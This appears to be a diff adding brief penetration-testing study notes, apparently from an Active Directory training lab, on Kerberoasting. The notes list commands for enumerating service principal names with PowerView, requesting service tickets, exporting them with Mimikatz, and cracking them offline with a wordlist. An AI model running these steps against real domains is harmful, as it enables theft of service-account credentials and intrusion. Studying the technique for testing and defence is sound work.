@@ -1,0 +1,15 @@
+-PowerView
+
+Get-NetUser -SPN
+
+-Request a TGS
+
+Request-SPNTicket -SPN *ServicePrincipalName of the Privileged user i.e MSSQLSvc/dcorp-mgmt*
+
+klist MSSQLSvc is there.
+
+-Mimikatz
+
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+-The .kirbi could be cracked with John and HashCat. In this case: python .\tgsrepcrack.py .\10k-worst-pass.txt(passlist.txt) hash
